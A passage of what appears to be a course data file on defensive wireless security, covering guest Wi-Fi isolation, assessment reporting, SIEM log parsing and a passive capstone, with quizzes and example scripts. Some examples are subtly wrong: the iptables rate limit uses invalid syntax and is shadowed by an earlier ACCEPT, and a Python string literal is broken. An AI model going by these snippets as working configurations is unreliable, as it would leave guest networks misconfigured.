                  code: '# This script analyzes beacon frames from a PCAP to visualize channel distribution.\n# This helps in identifying channel congestion and planning network layouts.\n# It does not perform any live network traffic capture.\nfrom scapy.all import rdpcap, Dot11, Dot11Elt\nfrom collections import Counter\n\ndef analyze_channel_usage(pcap_file):\n    """Counts the number of APs detected on each channel from beacon frames."""\n    channel_counter = Counter()\n    bssid_set = set()\n    try:\n        pkts = rdpcap(pcap_file)\n    except FileNotFoundError:\n        print(f"Error: File \'{pcap_file}\' not found.")\n        return\n\n    for p in pkts:\n        if p.haslayer(Dot11) and p.type == 0 and p.subtype == 8: # Beacon\n            bssid = p.addr3\n            # Only count each AP once to measure distribution, not beacon spam\n            if bssid not in bssid_set:\n                elt = p.getlayer(Dot11Elt)\n                while elt:\n                    if elt.ID == 3: # Channel IE\n                        channel_counter[elt.info[0]] += 1\n                        bssid_set.add(bssid)\n                        break\n                    elt = elt.payload.getlayer(Dot11Elt)\n\n    print(f"Channel Usage Histogram from \'{pcap_file}\':")\n    for channel, count in sorted(channel_counter.items()):\n        print(f"  - Channel {channel:<3}: {\'#\' * count} ({count} APs)")\n\n# Usage: Replace with a PCAP file you are authorized to analyze.\nanalyze_channel_usage(\'beacons.pcap\')',
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "In the 2.4 GHz band, which channels are considered non-overlapping in North America?",
                  options: [
                    "1, 2, 3",
                    "1, 5, 10",
                    "1, 6, 11",
                    "All channels are non-overlapping.",
                  ],
                  correct: 2,
                  explanation:
                    "Channels 1, 6, and 11 are spaced far enough apart that their signals do not significantly interfere with each other, which is fundamental to proper channel planning.",
                },
                {
                  id: 2,
                  question:
                    "A sudden and sustained drop in the signal-to-noise ratio (SNR) across all clients, combined with a high level of packet corruption, could be an indicator of what?",
                  options: [
                    "A firmware update.",
                    "A successful client connection.",
                    "Intentional or unintentional RF interference (jamming).",
                    "A hidden SSID.",
                  ],
                  correct: 2,
                  explanation:
                    "These are classic symptoms of a degraded RF environment, which could be caused by a competing device or a deliberate jamming attack.",
                },
              ],
            },
          },
          {
            id: "lesson-17",
            title: "Captive Portals & Secure Guest Wi-Fi Design",
            duration: "90 min",
            objectives: [
              "Design a secure guest network architecture based on the principle of least privilege and zero trust.",
              "Implement and configure VLAN isolation, firewall rules, and bandwidth limiting for guest traffic.",
              "Critically evaluate the security pitfalls and limitations of captive portal authentication.",
              "Develop and articulate a clear guest Wi-Fi acceptable use policy (AUP).",
            ],
            content: {
              overview:
                "Providing guest Wi-Fi is a common business requirement, offering convenience to visitors and clients. However, it introduces significant risk by connecting untrusted, unmanaged devices to your network edge. This lesson covers the best practices for designing and implementing a secure guest wireless network, with a focus on architectural isolation, traffic policing, and understanding that captive portals are a tool for policy enforcement, not strong security.",
              sections: [
                {
                  title:
                    "Secure Guest Network Architecture: Beyond a Separate SSID",
                  content:
                    "<p>The cardinal rule of guest Wi-Fi is <strong>absolute isolation</strong>. A guest device should be treated as a hostile actor on the internet.</p><h3>Key Architectural Components:</h3><ul><li><strong>Dedicated SSID & VLAN:</strong> The guest SSID must be bridged to a dedicated VLAN, completely separate from any internal, trusted VLANs (e.g., Corp, IoT, Management).</li><li><strong>Firewall as a Chokepoint:</strong> All traffic from the guest VLAN must be routed through a firewall. Default firewall rules must <strong>BLOCK</strong> all traffic to internal RFC1918 subnets (e.g., 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). The only allowed traffic should be out to the public internet.</li><li><strong>Client Isolation (AP Isolation):</strong> Must be enabled to prevent guest devices from communicating with each other, mitigating lateral movement between untrusted devices.</li><li><strong>Bandwidth Limiting (QoS):</strong> Implement rate limiting on the guest VLAN to prevent a single guest from consuming all available internet bandwidth, which is a common DoS vector.</li><li><strong>Separate DHCP Service:</strong> The guest VLAN should use a separate DHCP scope from a different IP range (e.g., 192.168.50.0/24 if internal uses 10.10.10.0/24).</li></ul>",
                },
                {
                  title: "The Reality of Captive Portals: Security Theater",
                  content:
                    "<p>A captive portal is a web page that users are redirected to before being granted network access. It's used for splash pages, terms of service (ToS) acceptance, or simple authentication (e.g., a shared password).</p><h3>Security Pitfalls:</h3><ul><li><strong>No Encryption:</strong> Traffic before the portal is bypassed is often unencrypted, exposing device information.</li><li><strong>Susceptible to Evil Twins:</strong> An attacker can easily create a rogue network with a identical-looking captive portal to steal credentials or deliver malware.</li><li><strong>Weak Authentication:</strong> Shared passwords for 'premium' guest access are often weak and rarely changed.</li><li><strong>User Behavior:</strong> Users are trained to click 'Accept' on any portal that appears, making them vulnerable to phishing.</li></ul><h3>Best Practices:</h3><ul><li><strong>Use it for Policy, Not Security:</strong> Its best use is to present an Acceptable Use Policy (AUP).</li><li><strong>Combine with Other Controls:</strong> Never rely on a portal alone. Its strength comes from being part of a layered architecture (VLANs, Firewalls).</li><li><strong>Consider More Secure Methods:</strong> For higher security, use WPA2-Enterprise with a dedicated guest credential database, or provide unique, time-limited codes.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title:
                    "Example iptables Firewall Rules for Guest VLAN Isolation",
                  language: "bash",
                  code: '# Example firewall rules for a Linux-based router/firewall.\n# Assume:\n# - WAN interface: eth0\n# - Guest VLAN interface: eth0.50\n# - Corporate LAN interface: eth0.10\n\n# 1. Set default policy to DROP\nsudo iptables -P FORWARD DROP\n\n# 2. Allow guest VLAN (eth0.50) to access the WAN (eth0)\nsudo iptables -A FORWARD -i eth0.50 -o eth0 -j ACCEPT\n\n# 3. Allow established/related traffic to return from WAN to guests\nsudo iptables -A FORWARD -i eth0 -o eth0.50 -m state --state RELATED,ESTABLISHED -j ACCEPT\n\n# 4. EXPLICITLY BLOCK traffic from Guest VLAN to Corporate LAN (eth0.10)\nsudo iptables -A FORWARD -i eth0.50 -o eth0.10 -j DROP\n\n# 5. (Optional) Allow DNS queries to your internal DNS server? Usually NOT recommended for guests.\n# sudo iptables -A FORWARD -i eth0.50 -o eth0.10 -p udp --dport 53 -j DROP\n\n# 6. (Optional) Rate limit per IP on the guest VLAN to prevent bandwidth abuse\n# This limits each IP to 5Mbps burstable to 10Mbps\nsudo iptables -A FORWARD -i eth0.50 -o eth0 -m limit --limit 5mb/s --limit-burst 10mb -j ACCEPT\nsudo iptables -A FORWARD -i eth0.50 -o eth0 -j DROP\n\necho "Guest VLAN firewall rules applied. Guests can access WAN but are isolated from Corp LAN."',
                },
                {
                  title:
                    "Simple Python Script to Check for Basic Network Isolation",
                  language: "python",
                  code: '# This script, run from a guest device, attempts to ping internal network addresses.\n# It helps validate that your firewall rules are working correctly.\n# It should NOT be able to ping any internal resources.\nimport os\nimport sys\n\ndef test_guest_isolation():\n    """Tests if the current device can reach common internal private IP ranges."""\n    # List of internal IP ranges and test addresses\n    test_targets = [\n        "10.0.0.1",      # Common gateway\n        "192.168.0.1",   # Common gateway\n        "192.168.1.1",   # Common gateway\n        "172.16.0.1",    # Common gateway\n        "8.8.8.8"        # Google DNS (public, should be reachable)\n    ]\n    \n    print("Testing guest network isolation...")\n    print("Public IP (8.8.8.8) should be reachable. Internal IPs should NOT be.\\n")\n    \n    for target in test_targets:\n        # Use \'-c 2\' for 2 packets and a short timeout\n        response = os.system(f"ping -c 2 -W 1 {target} > /dev/null 2>&1")\n        if response == 0:\n            status = "REACHABLE"\n            if target != "8.8.8.8":\n                status += " - ISOLATION FAILURE!"\n        else:\n            status = "UNREACHABLE (Good)"\n            if target == "8.8.8.8":\n                status = "UNREACHABLE - Internet access might be down."\n        print(f"{target}:\\t{status}")\n\nif __name__ == "__main__":\n    test_guest_isolation()',
                },
              ],
              activities: [
                {
                  title: "Draft a Guest Wi-Fi Acceptable Use Policy (AUP)",
                  description:
                    "Draft a one-page AUP for a corporate guest Wi-Fi network. It must include: 1) A clear statement that the network is for guest use only and is UNTRUSTED; 2) A list of prohibited activities (e.g., illegal file sharing, hacking attempts); 3) A disclaimer that traffic may be monitored and logged for security purposes; 4) A privacy statement regarding any data collected by the captive portal.",
                },
                {
                  title: "Architect a Secure Guest Network",
                  description:
                    "Using a diagramming tool, create a detailed network diagram. It must show: 1) The Guest SSID on an AP; 2) The AP tagging traffic to VLAN 50; 3) A router/firewall receiving this traffic; 4) Firewall rules blocking VLAN 50 from accessing the Corp VLAN (10) and Management VLAN (99), but allowing it to reach the WAN; 5) A separate DHCP server for the guest IP range.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the single most important security control for a guest Wi-Fi network?",
                  options: [
                    "A very long and complex captive portal password.",
                    "Using the WPA3 protocol instead of WPA2.",
                    "Complete logical isolation (via VLANs and firewall rules) from the internal corporate network.",
                    "Disabling SSID broadcast.",
                  ],
                  correct: 2,
                  explanation:
                    "Isolation is the non-negotiable foundation. Even if every other security measure fails, strong isolation ensures a compromised guest device cannot pivot to attack internal corporate assets. Encryption and passwords protect data and access but do not provide this critical segmentation.",
                },
                {
                  id: 2,
                  question:
                    "A captive portal that asks a user to accept an 'Acceptable Use Policy' before granting internet access is best described as:",
                  options: [
                    "A strong authentication mechanism.",
                    "A legal and policy enforcement tool that provides minimal network security.",
                    "A equivalent security control to using WPA2-Enterprise.",
                    "More secure than using a Pre-Shared Key (PSK).",
                  ],
                  correct: 1,
                  explanation:
                    "A captive portal for an AUP is primarily a legal and policy tool. It acts as a basic access gate but provides no meaningful cryptographic security for the network and is easily spoofed by attackers. It should never be relied upon as a primary security control.",
                },
                {
                  id: 3,
                  question:
                    "Why should 'Client Isolation' or 'AP Isolation' be enabled on a guest SSID?",
                  options: [
                    "To improve the Wi-Fi signal strength.",
                    "To prevent guest devices from communicating with and potentially attacking each other.",
                    "To make the network run faster.",
                    "To help devices find the AP more easily.",
                  ],
                  correct: 1,
                  explanation:
                    "Guest devices are untrusted. Client isolation is a critical layer of defense that contains a compromise. If one guest device is infected with malware, this feature prevents it from scanning and attacking other devices on the same guest network.",
                },
              ],
            },
          },
          {
            id: "lesson-18",
            title: "Reporting, Evidence & Remediation Tracking",
            duration: "90 min",
            objectives: [
              "Structure an effective security assessment report for technical and non-technical audiences.",
              "Write clear, concise, and actionable findings that prioritize business risk over technical minutiae.",
              "Apply principles of evidence preservation, ensuring data is anonymized and handled securely.",
              "Establish a process for tracking remediation efforts from discovery to validation and closure.",
            ],
            content: {
              overview:
                "The final report is the most critical deliverable of any security assessment. It is the artifact that translates technical observations into business risk, providing stakeholders with a clear roadmap for improvement. This lesson focuses on the art and science of creating a high-quality, professional report that is persuasive, actionable, and designed from a defensive, risk-management perspective.",
              sections: [
                {
                  title: "The Anatomy of a Professional Security Report",
                  content:
                    "<p>A good report tells a story: here is what we looked at, here is what we found, here is what it means, and here is how to fix it. It should be structured for both executives and technicians.</p><h3>Key Report Sections:</h3><ul><li><strong>Executive Summary:</strong> A high-level overview (1-2 pages) for leadership. Focus on business risk, overall posture, and key recommendations. Avoid technical jargon.</li><li><strong>Methodology:</strong> A description of the scope, tools, and techniques used (e.g., 'Passive monitoring', 'Authorized lab environment'). This establishes credibility and sets expectations.</li><li><strong>Detailed Findings:</strong> The core of the report. Each finding should be a self-contained unit of information.</li><li><strong>Conclusion & Overall Recommendations:</strong> Summarizes the assessment and provides strategic next steps.</li><li><strong>Appendices:</strong> For supporting data, glossary of terms, or detailed technical output.</li></ul>",
                },
                {
                  title: "Crafting the Perfect Finding",
                  content:
                    "<p>Each identified issue should be documented as a formal finding. A well-written finding is a powerful tool for driving change.</p><h3>Components of a Finding:</h3><ul><li><strong>Title:</strong> A concise, specific summary (e.g., 'Guest Wireless Network Lacks Client Isolation').</li><li><strong>Risk Rating:</strong> A consistent rating (e.g., Critical/High/Medium/Low/Info) based on a defined model (e.g., CVSS, DREAD, or a simple Likelihood x Impact matrix).</li><li><strong>Description:</strong> A clear explanation of the issue. <strong>What is it?</strong> Explain the vulnerability or misconfiguration. <strong>Why is it a problem?</strong> Describe the potential impact on confidentiality, integrity, or availability. Link it to a business consequence (e.g., 'This could allow an attacker to...').</li><li><strong>Evidence:</strong> <strong>Proof.</strong> Use annotated screenshots, sanitized log excerpts, or data from your analysis scripts. <strong>Critical:</strong> Anonymize all data (blur BSSIDs/MACs in screenshots, remove any potentially sensitive info). <strong>Never include exploit code, captured credentials, or personal data.</strong></li><li><strong>Remediation:</strong> <strong>Actionable, specific guidance.</strong> Don't just say 'harden the system'. Provide concrete steps (e.g., 'Navigate to Wireless -> SSID Settings -> Enable 'Client Isolation' or 'AP Isolation''). Where possible, provide multiple options (e.g., 'Short-term: Disable WPS. Long-term: Migrate to WPA3-Enterprise').</li><li><strong>References:</strong> Links to external resources (e.g., CIS Benchmarks, vendor advisories, CWE pages) that support your finding.</li></ul>",
                },
                {
                  title: "The Remediation Lifecycle: From Finding to Fix",
                  content:
                    "<p>Reporting doesn't end with delivery. A mature security program manages findings through their entire lifecycle.</p><ol><li><strong>Tracking:</strong> Use a ticketing system (e.g., Jira), spreadsheet, or dedicated GRC platform to track each finding's status (Open, In Progress, Resolved, Closed). Assign owners and due dates.</li><li><strong>Validation:</strong> Once the system owner reports a fix, the security team must <strong>re-test</strong> to verify the vulnerability is truly mitigated. This is a crucial step to prevent 'false closures'.</li><li><strong>Metrics & Reporting:</strong> Track metrics over time: mean time to remediate, number of open critical flaws, etc. This data is invaluable for measuring the program's effectiveness and justifying resources.</li></ol>",
                },
              ],
              codeExamples: [
                {
                  title: "Enhanced Report Generator with Finding Annotations",
                  language: "python",
                  code: '# This script expands on the previous example, generating a more comprehensive markdown report\n# that includes risk ratings and actionable remediation advice based on the inventory.\nimport csv\nfrom datetime import datetime\n\ndef generate_detailed_report(csv_file, report_file):\n    """Reads a WLAN inventory CSV and creates a detailed markdown report."""\n    try:\n        with open(csv_file, \'r\') as f:\n            reader = csv.DictReader(f)\n            inventory_data = list(reader)\n    except FileNotFoundError:\n        print(f"Error: Inventory file \'{csv_file}\' not found.")\n        return\n\n    with open(report_file, \'w\') as f:\n        # Report Header\n        f.write(f"# Wireless Security Assessment Report\\n\\n")\n        f.write(f"**Date:** {datetime.now().strftime(\'%Y-%m-%d\')}  \n")\n        f.write(f"**Scope:** Authorized Lab Network  \n")\n        f.write(f"**Methodology:** Passive RF Monitoring  \n")\n        f.write("\\n---\\n\\n")\n\n        # Executive Summary\n        f.write("## Executive Summary\\n\\n")\n        f.write("A passive wireless assessment was conducted to identify potential security misconfigurations...\\n\\n")\n        \n        # Generate summary counts for the executive summary\n        high_risks = sum(1 for row in inventory_data if row[\'Protected\'].strip().upper() == \'FALSE\')\n        med_risks = sum(1 for row in inventory_data if row[\'WPS_Enabled\'].strip().upper() == \'TRUE\')\n        \n        f.write(f"**Key Findings:**  \n")\n        f.write(f"- **{high_risks} High-Risk** findings related to missing encryption.  \n")\n        f.write(f"- **{med_risks} Medium-Risk** findings related to WPS being enabled.  \n\\n")\n        f.write("**Overall Recommendation:** Prioritize the remediation of networks lacking encryption, as they expose transmitted data to any nearby attacker.\\n\\n")\n        f.write("---\\n\\n")\n\n        # Detailed Findings Section\n        f.write("## Detailed Findings\\n\\n")\n\n        finding_id = 1\n        for row in inventory_data:\n            # Finding: Open Network\n            if row[\'Protected\'].strip().upper() == \'FALSE\':\n                f.write(f"### {finding_id}.1 - Open Wireless Network: \'{row[\'SSID\']}\'\\n\\n")\n                f.write(f"**Risk:** High  \n")\n                f.write(f"**BSSID:** `{row[\'BSSID\']}`  \n")\n                f.write(f"**Channel:** {row[\'Channel\']}  \n")\n                f.write("\\n**Description:**  \n")\n                f.write("The wireless network is configured without any encryption (Open). All data transmitted over this network is sent in clear text and can be intercepted by any device within range. This compromises the confidentiality of all communications.  \n")\n                f.write("\\n**Evidence:**  \n")\n                f.write("A beacon frame was captured showing the \'Privacy\' capability bit is not set.  \n")\n                f.write("\\n**Remediation:**  \n")\n                f.write("1. Configure the wireless network to use a strong encryption protocol.  \n")\n                f.write("2. **Immediate Action:** If this is a corporate network, enable WPA2/WPA3 immediately.  \n")\n                f.write("3. **If a Guest Network:** Implement a captive portal with Terms of Service, but note that this does not provide encryption.  \n")\n                f.write("\\n**References:**  \n")\n                f.write("- [CIS Critical Security Control 12.1: Maintain Inventory of Network Boundaries](https://www.cisecurity.org/controls/inventory-of-network-boundaries)  \n")\n                f.write("\\n---\\n\\n")\n\n            # Finding: WPS Enabled\n            if row[\'WPS_Enabled\'].strip().upper() == \'TRUE\':\n                f.write(f"### {finding_id}.2 - Wi-Fi Protected Setup (WPS) Enabled: \'{row[\'SSID\']}\'\\n\\n")\n                f.write(f"**Risk:** Medium  \n")\n                f.write(f"**BSSID:** `{row[\'BSSID\']}`  \n")\n                f.write(f"**Channel:** {row[\'Channel\']}  \n")\n                f.write("\\n**Description:**  \n")\n                f.write("WPS is enabled on this access point. WPS contains a design flaw that allows an attacker to recover the network\'s pre-shared key (password) through a brute-force attack, typically in 4-10 hours. This undermines the security provided by WPA2.  \n")\n                f.write("\\n**Evidence:**  \n")\n                f.write("A beacon frame was captured showing the WPS Information Element (IE) is present.  \n")\n                f.write("\\n**Remediation:**  \n")\n                f.write("1. Disable WPS in the wireless access point\'s administration interface.  \n")\n                f.write("2. Note: On some devices, the setting may be called \'QSS\' or may be enabled by default without a clear option to disable it. If it cannot be disabled, consider it a persistent vulnerability.  \n")\n                f.write("\\n**References:**  \n")\n                f.write("- [CVE-2014-9484: Pixie Dust Attack](https://nvd.nist.gov/vuln/detail/CVE-2014-9484)  \n")\n                f.write("\\n---\\n\\n")\n            finding_id += 1\n\n    print(f"Successfully wrote detailed markdown report to \'{report_file}\'")\n    print("Remember to review and anonymize any sensitive information before distribution.")\n\n# Usage:\ngenerate_detailed_report(\'wlan_inventory.csv\', \'detailed_wifi_audit_report.md\')',
                },
              ],
              activities: [
                {
                  title: "Write a Finding from a Scenario",
                  description:
                    "Given the following scenario, write a complete finding: 'During your assessment, you discover an AP broadcasting the SSID 'Company_Guest'. It uses WPA2-Personal with a PSK of 'company123'. Client isolation is disabled.' Draft the Title, Risk Rating, Description, Evidence, and Remediation sections.",
                },
                {
                  title: "Create a Remediation Tracker",
                  description:
                    "Design a simple spreadsheet or table to track security findings. Columns should include: Finding ID, Title, Risk Rating, Description, Asset Affected, Owner, Due Date, Status (Open/In Progress/Resolved/Closed), Validation Date, and Notes.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "When documenting a finding, the 'Remediation' section should contain:",
                  options: [
                    "The exact commands an attacker would use to exploit the vulnerability.",
                    "A vague statement that 'security should be improved'.",
                    "Specific, actionable steps that system administrators or engineers can take to fix the issue.",
                    "The name of the employee who configured the vulnerable system.",
                  ],
                  correct: 2,
                  explanation:
                    "The primary goal of a defensive report is to facilitate improvement. Clear, concrete, and actionable remediation steps are essential for the system owners to understand how to resolve the issue effectively.",
                },
                {
                  id: 2,
                  question:
                    "Why is it critical to anonymize evidence (e.g., blurring MAC addresses) in a final security report?",
                  options: [
                    "To make the report look more professional.",
                    "Because the report itself becomes a sensitive document that could create new risks if it contains real identifiers and is accidentally disclosed.",
                    "It is not necessary to anonymize evidence.",
                    "To save space in the report.",
                  ],
                  correct: 1,
                  explanation:
                    "A security report is a high-value target. Including real, sensitive data (like MAC addresses, which can be tied to specific devices) creates a privacy risk and a potential attack vector if the report is leaked. Practice data minimization.",
                },
                {
                  id: 3,
                  question:
                    "What is the purpose of the 'Validation' step in the remediation lifecycle?",
                  options: [
                    "To blame the system administrator if the fix doesn't work.",
                    "To formally verify that the remediation action taken has actually eliminated the vulnerability and does not inadvertently create new ones.",
                    "To close the ticket as quickly as possible.",
                    "To write a new report.",
                  ],
                  correct: 1,
                  explanation:
                    "Trust, but verify. Validation is a crucial quality control step to ensure that the risk has been effectively mitigated. Without it, you risk findings being 'closed' but still present.",
                },
              ],
            },
          },
          {
            id: "lesson-19",
            title: "Continuous Security: Telemetry & SIEM",
            duration: "90 min",
            objectives: [
              "Articulate the value of centralized logging for wireless security monitoring and incident response.",
              "Identify and prioritize key wireless events from controllers and APs for SIEM ingestion.",
              "Understand the process of log normalization and correlation to detect advanced threats.",
              "Design a SIEM alert for a specific wireless-based attack scenario.",
            ],
            content: {
              overview:
                "Point-in-time assessments provide a snapshot, but security is a continuous process. Modern defense requires ongoing visibility into the wireless environment. This lesson covers integrating Wireless Intrusion Detection/Prevention Systems (WIDS/WIPS) and network infrastructure with a Security Information and Event Management (SIEM) platform. This enables real-time alerting, sophisticated correlation across different data sources, and proactive threat hunting.",
              sections: [
                {
                  title: "The Case for Centralized Wireless Telemetry",
                  content:
                    "<p>Leaving logs on individual access points or controllers is a fragile strategy. An attacker who compromises a device can erase logs to cover their tracks. By streaming logs to a central, secure SIEM, you achieve:</p><ul><li><strong>Log Integrity:</strong> Protects evidence from tampering.</li><li><strong>Aggregation:</strong> Correlate events from hundreds of APs into a single view.</li><li><strong>Long-Term Retention:</strong> Store logs for months or years for compliance and forensic investigations.</li><li><strong>Advanced Analytics:</strong> Apply machine learning, threat intelligence feeds, and custom correlation rules to the data.</li></ul><p><strong>Common Log Sources:</strong> Syslog (UDP/TCP) from controllers/APs, SNMP traps, REST API calls to a cloud-based SIEM, or native integrations with platforms like Cisco DNA Center or Aruba Central.</p>",
                },
                {
                  title: "What to Log: Key Wireless Events for a SIEM",
                  content:
                    "<p>Not all events are created equal. Focus on logging events that indicate security-relevant activity.</p><h3>Critical Events to Ingest:</h3><ul><li><strong>WIDS/WIPS Alerts:</strong> The highest priority. Rogue AP detections, evil twin alerts, deauthentication floods, known attack signatures (e.g., KRACK, PMKID attacks).</li><li><strong>Authentication Events:</strong> All 802.1X successes and failures. This includes the user identity, MAC address, and AP used. Failed authentication spikes can indicate password spraying or brute-force attacks.</li><li><strong>Client Association/Disassociation:</strong> Track who is on the network, when, and where. Sudden disconnections of multiple users could indicate a DoS attack.</li><li><strong>AP Status Changes:</strong> An AP rebooting or going offline unexpectedly could indicate power failure, tampering, or a firmware-level compromise.</li><li><strong>Configuration Changes:</strong> Any changes to SSID settings, security policies, or radio parameters. This is crucial for auditing and detecting malicious insider activity.</li></ul>",
                },
                {
                  title:
                    "From Raw Logs to Actionable Intelligence: Normalization & Correlation",
                  content:
                    "<p>Raw syslog messages are messy. To enable correlation, logs must be <strong>parsed</strong> (structured) and <strong>normalized</strong> into a common schema like CEF or ECS.</p><h3>Example Correlation Rules:</h3><ul><li><strong>Impossible Traveler (Wireless):</strong> A user authenticates successfully from an AP in New York, and then 5 minutes later, the same username fails an authentication attempt from an AP in London. This strongly suggests credential compromise.</li><li><strong>Brute-Force Detection:</strong> 10+ failed 802.1X authentication attempts for a single user account within 60 seconds.</li><li><strong>Rogue AP & Client Correlation:</strong> A WIDS detects a rogue AP. The SIEM query then identifies any corporate devices that associated with that rogue AP, indicating a potential victim of an Evil Twin attack.</li><li><strong>Wireless DoS followed by Wired Intrusion:</strong> A deauth flood is detected on the wireless network, followed by a successful lateral movement attempt from a wired device moments later. This could be a smokescreen attack.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title:
                    "Parsing a Realistic Syslog Message for SIEM Ingestion",
                  language: "python",
                  code: '# This example parses a realistic syslog message from an Aruba controller into a structured format.\n# The output is a JSON document following a schema like Elastic Common Schema (ECS).\n# This structured data is what a SIEM would use for correlation.\n\nimport re\nimport json\nfrom datetime import datetime\n\ndef parse_aruba_syslog(syslog_line):\n    """Parses a syslog line and returns a normalized JSON document."""\n    \n    # Example: <190>Nov 15 10:30:45 10.0.100.10 1 15:30:45.450 EST: %WIDS-4-ROGUE_AP_DETECTED: WIDS: Rogue AP detected: BSSID 00:11:22:33:44:55, SSID "Free WiFi", Channel 6, Type Rogue, RSSI -65\n    \n    # Define a regex pattern to match the components\n    pattern = r"<\\d+>([A-Za-z]{3} \\d{1,2} \\d{2}:\\d{2}:\\d{2}) ([\\d.]+) (.*)"\n    match = re.search(pattern, syslog_line)\n    \n    if not match:\n        return None\n        \n    log_timestamp_str, controller_ip, message = match.groups()\n    \n    # Parse the timestamp (simplified)\n    log_timestamp = datetime.strptime(log_timestamp_str + " " + str(datetime.now().year), "%b %d %H:%M:%S %Y")\n    \n    # Parse the WIDS message\n    wids_pattern = r\'.*%WIDS-.*ROGUE_AP_DETECTED.*BSSID ([0-9A-Fa-f:]{17}).*SSID "([^"]*)".*Channel (\\d+).*RSSI (-?\\d+)\'\n    wids_match = re.search(wids_pattern, message)\n    \n    normalized_doc = {\n        "@timestamp": log_timestamp.isoformat() + "Z",\n        "event": {\n            "kind": "alert",\n            "category": ["intrusion_detection"],\n            "type": ["wireless"],\n            "module": "aruba_controller",\n            "original": syslog_line.strip() # Always keep the original log\n        },\n        "observer": {\n            "ip": controller_ip,\n            "type": "wireless_controller",\n            "vendor": "Aruba Networks"\n        }\n    }\n    \n    if wids_match:\n        bssid, ssid, channel, rssi = wids_match.groups()\n        normalized_doc[\'aruba\'] = {\n            \'wids\': {\n                \'alert_type\': \'rogue_ap_detected\',\n                \'rogue_ap\': {\n                    \'bssid\': bssid,\n                    \'ssid\': ssid,\n                    \'channel\': int(channel),\n                    \'rssi\': int(rssi)\n                }\n            }\n        }\n        # Map to ECS fields for better correlation\n        normalized_doc[\'source\'] = { \'mac\': bssid }\n        normalized_doc[\'wireless\'] = { \'ssid\': ssid }\n        \n    return normalized_doc\n\n# Example Usage\nsample_log = "<190>Nov 15 10:30:45 10.0.100.10 1 15:30:45.450 EST: %WIDS-4-ROGUE_AP_DETECTED: WIDS: Rogue AP detected: BSSID 00:11:22:33:44:55, SSID \\"Free WiFi\\", Channel 6, Type Rogue, RSSI -65"\n\nparsed_event = parse_aruba_syslog(sample_log)\nif parsed_event:\n    print("Normalized Event for SIEM:")\n    print(json.dumps(parsed_event, indent=2))\n    # In a real scenario, you would now send this JSON to Elasticsearch, Splunk, etc.',
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Why is it important to send wireless logs to a central SIEM instead of just storing them on the wireless controller?",
                  options: [
                    "It is a requirement for all wireless vendors.",
                    "To allow for correlation with other data sources (like VPN or AD logs) and to protect the logs from being tampered with by an attacker who compromises the controller.",
                    "Because wireless controllers have unlimited storage.",
                    "To make the logs available to all employees.",
                  ],
                  correct: 1,
                  explanation:
                    "Centralizing logs serves two primary defensive purposes: 1) It enables cross-domain correlation, which is essential for detecting sophisticated attacks, and 2) It protects the integrity of the logs by moving them away from the potentially compromised device itself.",
                },
                {
                  id: 2,
                  question:
                    "An alert that triggers when a user successfully authenticates to the Wi-Fi from one building, and then fails authentication from a different building two minutes later, is an example of what SIEM capability?",
                  options: [
                    "Log Storage",
                    "Data Correlation",
                    "File Integrity Monitoring",
                    "Asset Management",
                  ],
                  correct: 1,
                  explanation:
                    "This is correlation. The SIEM is linking two separate events (a success and a failure for the same user) from different physical sources (APs in different buildings) based on time and user identity to identify a pattern that is physically impossible and therefore suspicious.",
                },
                {
                  id: 3,
                  question:
                    "What is the purpose of log normalization (e.g., using a schema like ECS) when ingesting data into a SIEM?",
                  options: [
                    "To make the logs unreadable.",
                    "To reduce the amount of storage needed.",
                    "To ensure field names and values are consistent across different log sources, enabling accurate searching and correlation.",
                    "To encrypt the logs.",
                  ],
                  correct: 2,
                  explanation:
                    "Normalization is a key process for making sense of multi-vendor environments. It maps different vendor-specific terms (e.g., 'src_ip', 'sourceAddress', 'ip.src') to a common field name (e.g., 'source.ip'). This allows an analyst to write a single query that works across all their devices.",
                },
              ],
            },
          },
          {
            id: "lesson-20",
            title: "Capstone (Blue‑Team Wireless Assessment)",
            duration: "180 min",
            objectives: [
              "Execute the complete defensive assessment lifecycle: Planning, Collection, Analysis, Reporting, and Remediation validation.",
              "Synthesize the techniques and scripts from all previous lessons to perform a holistic, passive assessment of a lab network.",
              "Produce a professional, evidence-based security report tailored to a specific audience (e.g., CISO vs. Network Engineer).",
              "Develop a prioritized hardening plan and, if possible, implement and validate the changes.",
            ],
            content: {
              overview:
                "This capstone project is the culmination of your defensive wireless training. You will act as a security consultant for your own lab environment, conducting a full, end-to-end assessment. This mirrors a real-world blue-team engagement, moving from isolated techniques to a comprehensive process. You will not be exploiting vulnerabilities but rather meticulously documenting them to create a actionable report for remediation.",
              sections: [
                {
                  title: "The Five Phases of a Defensive Assessment",
                  content:
                    "<p>Follow this structured methodology to ensure a thorough and professional engagement.</p><ol><li><strong>Planning & Scoping (15 mins):</strong> Define the goal: 'Identify all wireless security misconfigurations in the lab network.' Define the rules of engagement: <strong>PASSIVE ONLY.</strong> No transmitting, no association to networks, no probing. Document the scope: 'The 2.4 GHz and 5 GHz spectrum in the immediate vicinity of my lab.'</li><li><strong>Collection & Evidence Gathering (45 mins):</strong> Using your monitor-mode adapter, perform a capture session long enough to gather meaningful data. 10-15 minutes is a good start. Ensure you capture beacon frames, probe responses, and other management traffic. Save the PCAP file securely. <strong>Critical:</strong> Only capture traffic you are explicitly authorized to (i.e., your own lab network).</li><li><strong>Analysis & Triage (60 mins):</strong> This is where you run your arsenal of defensive scripts. Triage the findings: which are critical? Which are informational? Correlate data from different scripts to build a complete picture of the network's security posture.</li><li><strong>Reporting & Communication (45 mins):</strong> Consolidate your analyzed evidence into the report format mastered in Lesson 18. Write for your audience. The executive summary should be clear and risk-focused. The technical findings should be detailed and actionable.</li><li><strong>Remediation & Validation (15 mins):</strong> (Optional but recommended) If your lab AP allows it, implement the top 1-2 remediation steps from your report (e.g., disable WPS, enable client isolation). <strong>Re-run your capture and analysis scripts to validate that the finding is no longer present.</strong> This closes the loop.</li></ol>",
                },
              ],
              codeExamples: [
                {
                  title: "Master Capstone Analysis Script",
                  language: "bash",
